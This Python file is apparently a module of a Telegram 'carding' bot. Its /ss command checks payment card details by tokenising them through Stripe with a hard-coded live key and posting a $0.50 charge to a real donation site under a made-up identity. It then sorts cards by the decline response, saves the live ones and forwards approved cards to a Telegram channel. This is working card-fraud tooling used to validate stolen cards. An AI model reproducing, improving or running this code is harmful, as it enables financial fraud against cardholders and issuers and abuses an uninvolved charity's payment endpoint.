import requests
import time
import random
import json
import string
import re
from datetime import datetime
from random import choice

from pyrogram import Client
from pyrogram.types import Message

from carding.functions import *
from carding.database.checkuser_sql import already_added

@Client.on_message(cmd('ss'))
async def ssc_func(client, message: Message):
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    #if user_id != 5032070399:
       #return await message.reply("**GATE MAINTENANCE!**")
    if is_spam(user_id):
        return await message.reply_text(text="**ANTISPAM!**\n`Wait in 5s and try again..`",reply_to_message_id=message.message_id)
    try:
        if already_added(user_id):
            pass
        elif not already_added(user_id):
            await message.reply_text(text="Please **register** 1st..\nSend /register to registered",reply_to_message_id=message.message_id)
            return
        query = ''
        for i in message.command[1:]:
            query += ' ' + str(i)
        if not query:
            await message.reply_text(text="**Input valid cc\nEx: `/ss cc|mm|yy|cvv`**",reply_to_message_id=message.message_id)
            return
        xx = await message.reply_text(text="**Checking your card..⏳**",reply_to_message_id=message.message_id)
        start_time = time.time()
        splitter = re.findall(r"[0-9]+", query)
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        cvc = splitter[3]
        strlenx = len(cc)
        cvvd = cvc[:3]
        cvvx = cvc[:4]
        bin = cc[:6]

        file = open('carding/temp/bin.txt', 'r').readlines() 
        if str(bin) + "\n" in file:
           await xx.edit_text("**BIN BANNED!**"
                                )
           return

        if (strlenx < 16):
            cvv = cvvx
        else:
            cvv = cvvd

        lista = cc + "|" + mes + "|" + ano + "|" + cvv

        res = requests.get("https://dragon-bin-api.vercel.app/api/" + bin)
        vendor = getStr(res.text, '"vendor":"', '"')
        bank = getStr(res.text, '"bank":"', '"')
        type = getStr(res.text, '"type":"', '"')
        country = getStr(res.text, '"country":"', '"')
        level = getStr(res.text, '"level":"', '"')
        flag = getStr(res.text, '"emoji":"', '"')
        # -----------[ If Not Respond ]----------------
        vendor = "Null" if not vendor else vendor
        bank = "Null" if not bank else bank
        type = "Null" if not type else type
        country = "Null" if not country else country
        level = "Null" if not level else level

        res = requests.get(
            "https://randomuser.me/api/?nat=us&inc=name,location")
        random_data = json.loads(res.text)

        fname = random_data['results'][0]['name']['first']  # pylint:disable=E0602
        lname = random_data['results'][0]['name']['last']  # pylint:disable=E0602
        street = str(random_data['results'][0]['location']['street']['number']) + " " + \
            random_data['results'][0]['location']['street']['name']  # pylint:disable=E0602
        city = random_data['results'][0]['location']['city']  # pylint:disable=E0602
        state = random_data['results'][0]['location']['state']  # pylint:disable=E0602
        zip = random_data['results'][0]['location']['postcode']  # pylint:disable=E0602
        email = str(
            ''.join(
                random.choices(
                    string.ascii_lowercase + string.digits,
                    k=8))) + '@gmail.com'
        password = str(
            "".join(
                random.choices(
                    string.ascii_uppercase +
                    string.digits,
                    k=10)))

        urlm6 = 'https://m.stripe.com/6'
        headerm6 = {
            'authority': 'm.stripe.com',
            'path': '/6',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'text/plain;charset=UTF-8',
            'cookie': 'm=b9d01ffe-dd58-4c45-8916-1323840007a7acdd12',
            'origin': 'https://m.stripe.network',
            'referer': 'https://m.stripe.network/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.56 Mobile Safari/537.36'}

        m6 = requests.post(url=urlm6, headers=headerm6)
        json_m6 = json.loads(m6.text)
        Muid = json_m6["muid"]
        Guid = json_m6["guid"]
        Sid = json_m6["sid"]

        url1 = 'https://api.stripe.com/v1/tokens'

        headers1 = {
            "authority": "api.stripe.com",
            "path": "/v1/tokens",
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.49 Mobile Safari/537.36"
        }
        data1 = f"card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={Guid}&muid={Muid}&sid={Sid}&payment_user_agent=stripe.js%2Fc0ae72707%3B+stripe-js-v3%2Fc0ae72707&time_on_page=37877&key=pk_live_51IGQ3SLi27PnGwjb4GmHAED6YzkLQimwZH6REIlOScIBSZmuCyG5uIhtEd208jL1GkEaXd6eZEhuFI0hOtksTGce00eobJsYEX&pasted_fields=number"

        res1 = requests.post(url=url1, headers=headers1, data=data1)

        url2 = 'https://www.weingart2022.com/api/donate'

        headers2 = {
            "authority": "www.weingart2022.com",
            "path": "/api/donate",
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "cookie": f"__stripe_mid={Muid}; __stripe_sid={Sid}",
            "origin": "https://www.weingart2022.com",
            "referer": "https://www.weingart2022.com/donate",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.49 Mobile Safari/537.36"}

        ecode = getStr(res1.text, '"message": "', '"')
        id = getStr(res1.text, '"id": "', '"')
        res = requests.post(
            url=url2,
            headers=headers2,
            data='{"amount":0.5,"name":"' +
            fname +
            ' ' +
            lname +
            '","phone":"+16173000956","email":"' +
            email +
            '","address":{"line1":"130 Duane St","city":"New York","postal_code":"10013","state":"NY","country":"US"},"cardholder":{"address_line1":"130 Duane St","address_city":"New York","address_zip":"10013","address_state":"NY","address_country":"US"},"metadata":{"employed":false},"monthly":false,"source":"' +
            id +
            '"}')
        dcode = getStr(res.text, '"decline_code":"', '"')
        receipt = getStr(res.text, '"receipt_url":"', '"')
        stop_time = time.time() - start_time
        date = datetime.today().strftime('%d-%m-%Y')

        if '"seller_message":"Payment complete."' in res.text or '"cvc_check":"pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state":"succeeded"' in res.text or "Your payment has already been processed" in res.text or '"status":"succeeded"' in res.text:
            status = "𝐂𝐕𝐕 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "Card Live Passed"
            saveCH(lista)
            await client.send_message(-1001745520470, f"""
<b>𝐆𝐀𝐓𝐄 𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 0,5$</b>
•━━━━━━━━━━━━━━━━━━━•
<code>{lista}</code>
╾──────────────────╼
<b>•𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:</b> APPROVED ✅
<b>•𝗠𝗲𝘀𝘀𝗮𝗴𝗲:</b> Charged 0,5$ ✓
<b>•𝗥𝗲𝗰𝗲𝗶𝗽𝘁:</b> <a href={receipt}>Klick-Here</a>
<b>•𝗕𝗮𝗻𝗸 𝗡𝗮𝗺𝗲:</b> {bank}
<b>•𝗖𝗮𝗿𝗱 𝗕𝗿𝗮𝗻𝗱:</b> {vendor}
<b>•𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲:</b> {type} • {level}
<b>•𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {country} {flag}
•━━━━━━━━━━━━━━━━━━━•
<b>•𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:</b> <a href="tg://user?id={user_id}">{name}</a>
<b>•𝐁𝐨𝐭 𝐁𝐲:</b> @xcardinglive
<b>•𝐓𝐢𝐦𝐞:</b> <code>{stop_time:.02f}s</code> [ {date} ]
""", parse_mode="HTML")
        elif 'incorrect_zip' in res.text or 'Your card zip code is incorrect.' in res.text or 'incorrect_cvc' in res.text or 'card zip code is incorrect' in res.text:
            status = "➜ 𝐂𝐂𝐍 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "INCORRECT CVC"
            saveCCN(lista)
        elif "card has insufficient funds" in res.text or 'insufficient_funds' in res.text or 'Insufficient Funds' in res.text:
            status = "➜ 𝐂𝐕𝐕 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "Card Live"
            saveCVV(lista)
        elif 'fraudulent' in res.text:
            status = "➜ 𝐂𝐕𝐕 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "Card Live"
            saveCVV(lista)
        elif 'authentication_required' in res.text:
            status = "➜ 𝐂𝐕𝐕 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "Card Live VBV"
            saveCVV(lista)
        elif 'card_decline_rate_limit_exceeded' in res.text or 'card_decline_rate_limit_exceeded' in res1.text:
            status = "➜ 𝐂𝐕𝐕 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "Rate_Limit_Exceeded"
            saveCVV(lista)
        elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text:
            status = "➜ 𝐂𝐂𝐍 𝐌𝐀𝐓𝐂𝐇𝐄𝐃 ✅"
            reson = "Security code is incorrect!"
            saveCCN(lista)
        elif "card does not support this type of purchase" in res.text or 'transaction_not_allowed' in res.text or 'Transaction Not Allowed' in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Transaction_Not_Allowed"
        elif "do_not_honor" in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Do_Not_Honor"
        elif "service_not_allowed" in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Service_Not_Allowed"
        elif "lost_card" in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Lost Card"
        elif "restricted_card" in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Restricted_Card"
        elif "generic_decline" in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Generic_Decline"
        elif "try_again_later" in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Try_Again_Later"
        elif "pickup_card" in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Pickup Card"
        elif "stolen_card" in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "stolen_card"
        elif "exipred_card" in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Exipred Card"
        elif "invalid_account" in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Invalid_Account"
        elif "invalid_expiry_year" in res1.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Expired Card!"
        elif "invalid_expiry_month" in res1.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Expired Card!"
        elif "Your card number is incorrect." in res1.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Your card number is incorrect."
        elif "card number is incorrect" in res.text or 'incorrect_number' in res.text or 'Invalid Credit Card Number' in res.text or 'card number is incorrect' in res.text:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = "Incorrect_Number"
        else:
            status = "➜ 𝐂𝐀𝐑𝐃 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 🛑"
            reson = dcode

        lrespon = f"""
𝐒𝐓𝐀𝐓𝐒 {status}
•━━━━━━━━━━━━━━━━━━━•
<code>{lista}</code>
╾──────────────────╼
<b>•Result:</b> {reson}
<b>•Gateway:</b> Stripe Auth
╾──────────────────╼
<b>•Bank Name:</b> {bank}
<b>•Card Brand:</b> {vendor}
<b>•Card Type:</b> {type} • {level}
<b>•Country:</b> {country} {flag}
<b>•Took:</b> <code>{stop_time:.02f}s</code> [ {date} ]
•━━━━━━━━━━━━━━━━━━━•
<b>•Checked By:</b> <a href="tg://user?id={user_id}">{name}</a> [ {ustat(user_id)} ]
<b>•Bot By:</b> <a href="https://t.me/X_DEVX">IM NOOB</a>
"""

        await xx.edit_text(lrespon, parse_mode="HTML")
    except IndexError as e:
        await xx.edit_text("Invalid Format!")
    except Exception as e:
        
        print(e)
